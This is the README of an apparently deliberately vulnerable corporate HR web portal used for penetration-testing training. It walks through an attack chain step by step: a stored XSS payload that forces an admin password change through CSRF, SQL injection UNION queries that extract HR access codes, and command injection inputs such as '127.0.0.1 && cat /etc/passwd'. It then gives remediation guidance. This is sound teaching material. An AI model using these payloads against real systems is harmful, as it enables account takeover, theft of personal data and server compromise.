# FakeCompany — Intentionally Vulnerable Corporate Portal

A realistic employee HR portal built for **hands-on web penetration testing** and red-team coursework. FakeCompany looks and behaves like an internal corporate application — employee directory, feedback channel, admin panel, and confidential HR records — while containing deliberate security flaws wired into a **coherent attack chain**.

Use it to practice finding vulnerabilities manually (Burp Suite, browser dev tools), documenting findings with CVSS and OWASP mappings, and writing remediation guidance — not just running automated scanners.

> **Warning:** This application is intentionally insecure. Deploy only in isolated lab environments (virtual machines). Never expose it to the public internet.

**Command injection safety:** By default, Network Diagnostics runs in **lab safe mode** — payloads like `127.0.0.1; id` return **simulated** output and do **not** execute OS commands on your machine. On a dedicated isolated target VM you may set `FAKECOMPANY_UNSAFE_COMMANDS=1` for real execution during demos.

---

## What This Application Is For

| Goal | How FakeCompany helps |
|------|------------------------|
| **Learn web pentest methodology** | Follow a realistic path from low-privilege guest to full data exposure |
| **Practice client-side attacks** | Stored XSS, CSRF (via XSS) |
| **Practice server-side attacks** | SQL injection, OS command injection |
| **Write a professional report** | Each vector maps to OWASP Top 10:2025 with clear PoC steps |
| **Demonstrate attack chaining** | One scenario links multiple bugs into a single narrative |

FakeCompany is **not** a production system. It is a controlled training ground where every weakness is there on purpose.

---

## Lab Architecture

Designed to run on a **target virtual machine** in your lab network:

```
┌─────────────┐      :80       ┌──────────────────────────────────────┐
│ Kali / Burp │ ─────────────► │  Target VM (DMZ)                     │
└─────────────┘                │  nginx :80 → gunicorn :5000 → SQLite │
                               └──────────────────────────────────────┘
```

| Component | Role |
|-----------|------|
| **nginx** | Public-facing web server in the DMZ (port 80) |
| **gunicorn + Flask** | Application backend, bound to `127.0.0.1:5000` only |
| **SQLite** | Persistent database (`fakecompany.db`) — real server-side storage, not simulated in a single file |

Network segmentation (DMZ vs. internal network, firewall rules between Kali and the target) is configured at the hypervisor or host firewall level.

---

## Quick Start

### Prerequisites (Ubuntu / Debian)

```bash
sudo apt update
sudo apt install -y python3 python3-venv python3-pip nginx
```

### Install the application

```bash
cd /opt/fakecompany   # or your project path
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

**Development mode** (quick smoke test):

```bash
python app.py
# Open http://<VM_IP>:5000
```

### Production mode (recommended for the lab)

```bash
source venv/bin/activate
gunicorn --bind 127.0.0.1:5000 --workers 2 app:app
```

**systemd service** — save as `/etc/systemd/system/fakecompany.service`:

```ini
[Unit]
Description=FakeCompany portal
After=network.target

[Service]
User=www-data
Group=www-data
WorkingDirectory=/opt/fakecompany
Environment="PATH=/opt/fakecompany/venv/bin"
Environment="FLASK_DEBUG=0"
ExecStart=/opt/fakecompany/venv/bin/gunicorn --bind 127.0.0.1:5000 --workers 2 app:app
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

```bash
sudo systemctl daemon-reload
sudo systemctl enable --now fakecompany
```

### nginx reverse proxy

Create `/etc/nginx/sites-available/fakecompany`:

```nginx
server {
    listen 80;
    server_name _;

    # Intentionally missing X-Frame-Options — required for clickjacking demo
    location / {
        proxy_pass http://127.0.0.1:5000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}
```

```bash
sudo ln -s /etc/nginx/sites-available/fakecompany /etc/nginx/sites-enabled/
sudo nginx -t && sudo systemctl reload nginx
```

### Firewall

```bash
sudo ufw allow 80/tcp
sudo ufw enable
```

Do **not** expose port 5000 externally — all traffic should go through nginx on port 80.

**Portal URL:** `http://<VM_IP>`

---

## Demo Accounts

| Username | Password | Role | Access |
|----------|----------|------|--------|
| `guest` | `guest123` | guest | Limited portal access; can submit feedback |
| `admin` | `admin123` | admin | Full admin panel, user search, password settings |
| `diana` | `diana2024!` | employee | Standard employee access |
| `alex` | `sysadmin99` | employee | Standard employee access |
| `maria` | `hr_secure1` | employee | Standard employee access |

---

## Main Attack Chain

The primary scenario ties multiple vulnerabilities into one story — ideal for a thesis or lab report:

```
Guest account
      ↓
Stored XSS on /contact
      ↓
Admin opens Feedback Inbox
      ↓
XSS sends POST to /admin/settings/password (no CSRF token)
      ↓
Attacker logs in as admin
      ↓
Admin → Open HR file → phone/extension only, PII locked behind HR code
      ↓
SQL Injection on /admin/search → extract pii_access_code from hr_records
      ↓
Enter code on HR file → salary, SSN, internal notes (application-layer breach)
      ↓
Command Injection on /admin/diagnostics → OS commands as www-data (server compromise)
```

### Minimum findings (2 + 2)

| Side | # | Vector | Where |
|------|---|--------|-------|
| **Client** | 1 | Stored XSS | `/contact` |
| **Client** | 2 | CSRF (triggered via XSS) | `/admin/settings/password` |
| **Server** | 1 | SQL Injection | `/admin/search` → HR access codes from DB |
| **Server** | 2 | OS Command Injection | `/admin/diagnostics` — shell metacharacters in `host` (simulated by default) |

Optional bonus: **Clickjacking** — `static/poc/clickjacking.html` (missing `X-Frame-Options`).

### Step 1 — Guest account + Stored XSS

1. Log in as `guest` / `guest123`
2. Open **Feedback** (`/contact`)
3. Submit this payload:

```html
<img src=x onerror="fetch('/admin/settings/password',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'new_password=pwned123&confirm_password=pwned123',credentials:'include'})">
```

### Step 2 — Admin views feedback

1. Log in as `admin` / `admin123` (separate browser or after signing out)
2. Go to **Admin → Feedback Inbox** (`/contact`)
3. The stored XSS executes in the admin's browser and changes the password to `pwned123`

### Step 3 — Attacker takeover

```
Username: admin
Password: pwned123
```

### Step 4 — Admin opens HR file (PII locked)

1. Go to **Admin Dashboard → Employee HR files**
2. Click **Open HR file** for Alex Ivanov (`/admin/hr/2`)
3. You see **non-sensitive** data only: work phone, office extension, department
4. The **PII section** (salary, SSN, internal notes) is locked — the form asks for an **HR PII access code** known only to HR staff

### Step 5 — SQL Injection (extract HR access codes)

Navigate to **Admin → Account Lookup** (`/admin/search`). Test the `username` parameter in Burp Repeater.

**Discover injection:**
```
admin' OR '1'='1'--
```

**Extract HR PII access codes** from the `hr_records` table via UNION (4 columns must match the query):

```
' UNION SELECT employee_id, pii_access_code, phone, office_extension FROM hr_records--
```

Example result mapping:

| Account ID | Username *(actual: access code)* | Role *(actual: phone)* | Email *(actual: ext.)* |
|------------|----------------------------------|------------------------|------------------------|
| 2 | PII-A2-9B2C | +1-555-0187 | ext. 512 |

The legitimate search never returns `pii_access_code` — SQL injection is the only way to obtain it.

### Step 6 — Unlock PII with stolen code

1. Return to **Admin → Open HR file** for Alex (`/admin/hr/2`)
2. Enter the code from Step 5: `PII-A2-9B2C`
3. PII section unlocks — salary ($112,000), SSN, home address, internal notes

At this point the attacker has breached **application data**. The next step escalates to the **operating system**.

### Step 7 — OS Command Injection (server compromise)

Navigate to **Admin → Network Diagnostics** (`/admin/diagnostics`). The form runs `ping` against a user-supplied host — input is passed to a shell without sanitization.

**Proof of concept:**

```
127.0.0.1; id
```

```
127.0.0.1 && cat /etc/passwd
```

```
127.0.0.1 | whoami
```

The output panel shows results consistent with OS command execution (e.g. `uid=www-data`). In default **lab safe mode**, output is **simulated** — the vulnerable pattern exists in the application design, but no real shell command runs on your host. For an isolated target VM demo, set `FAKECOMPANY_UNSAFE_COMMANDS=1`.

**Why this fits the chain:** SQLi steals **database secrets** (HR codes → PII). Command injection demonstrates **server-level compromise** — the natural post-exploitation step once admin access is obtained.

---

## Vulnerability Reference

| Vector | Location | OWASP Top 10:2025 |
|--------|----------|-------------------|
| **Stored XSS** | `/contact` — unsanitized output (`\|safe`) | A03 — Injection |
| **CSRF** (via XSS) | `/admin/settings/password` — no anti-CSRF token | A01 — Broken Access Control |
| **Clickjacking** | Missing `X-Frame-Options` / CSP `frame-ancestors` | A01 — Broken Access Control |
| **SQL Injection** | `/admin/search` — string concatenation in query | A03 — Injection |
| **Command Injection** | `/admin/diagnostics` — unsanitized input in `shell=True` | A03 — Injection |

**Optional — Clickjacking:** `static/poc/clickjacking.html` (missing `X-Frame-Options`).

---

## Route Map

| Route | Auth | Description |
|-------|------|-------------|
| `/` | Required | Employee dashboard |
| `/login` | Public | Sign-in page |
| `/employees` | Required | Employee directory |
| `/profile/<id>` | Public | Public employee profile |
| `/contact` | Public | Feedback form (**stored XSS**) |
| `/admin` | Admin | Dashboard + employee HR file links |
| `/admin/hr/<id>` | Admin | HR file (contact info + PII code gate) |
| `/admin/diagnostics` | Admin | Network ping tool (**command injection**) |
| `/admin/search` | Admin | Account lookup (**SQLi** on `username`) |
| `/admin/settings/password` | Admin | Password change (**CSRF**) |

---

## Remediation Summary

| Vulnerability | Fix |
|---------------|-----|
| Stored XSS | Remove `\|safe`; auto-escape output; add CSP (`script-src 'self'`) |
| CSRF | Use CSRF tokens (e.g. Flask-WTF); set `SameSite=Strict` on session cookies |
| SQL Injection | Parameterized queries: `cursor.execute("... WHERE username = ?", (username,))` |
| Command Injection | Never pass user input to `shell=True`; use `subprocess.run(["ping", "-c", "3", host])` with strict host validation |
| PII codes in DB | Store secrets outside the DB; rate-limit code entry attempts |
| Clickjacking | Add `X-Frame-Options: DENY` or `Content-Security-Policy: frame-ancestors 'none'` |

---

## Recommended Tools

- **[Burp Suite Community](https://portswigger.net/burp/communitydownload)** — intercept requests, use Repeater for SQLi
- **Firefox + Burp proxy** — demonstrate XSS and CSRF in the browser
- **sqlmap** (optional) — compare automated vs. manual exploitation in your report

---

## Report Template

A full penetration test report skeleton is provided in **[REPORT_TEMPLATE.md](REPORT_TEMPLATE.md)**. Copy it into your thesis or lab deliverable and fill in the placeholders.

The template includes:

| Section | Contents |
|---------|----------|
| **Executive Summary** | Metrics, key risks, overall recommendation |
| **Scope & Methodology** | WSTG-aligned test phases, tools, rules of engagement |
| **Test Environment** | Lab diagram, host IPs, accounts used |
| **Attack Chain Summary** | Narrative kill chain (guest → admin → data breach) |
| **Findings Summary** | Table with CVSS scores and OWASP Top 10:2025 mapping |
| **Detailed Findings (×5)** | Pre-filled: XSS, CSRF, clickjacking (bonus), SQLi, command injection |
| **Per-finding blocks** | Description, discovery steps, Burp PoC, impact, CVSS justification, remediation |
| **Remediation Roadmap** | Prioritized fix schedule |
| **Appendices** | Screenshot index, Burp logs, tool versions |

Each finding follows the format required for coursework: **where found → how found → PoC → CVSS → OWASP → remediation**.

---

## Project Structure

```
FakeCompany/
├── app.py                  # Flask application (routes, DB, vulnerabilities)
├── requirements.txt        # Python dependencies
├── REPORT_TEMPLATE.md      # Penetration test report skeleton (thesis / lab)
├── fakecompany.db          # SQLite database (created on first run)
├── static/
│   ├── css/style.css       # Portal styling
│   └── poc/
│       └── clickjacking.html
└── templates/              # Jinja2 HTML templates
```

---

## License & Disclaimer

FakeCompany is an **educational security training application**. All vulnerabilities are intentional. The authors assume no liability for misuse. Use responsibly, only in environments you own and control.
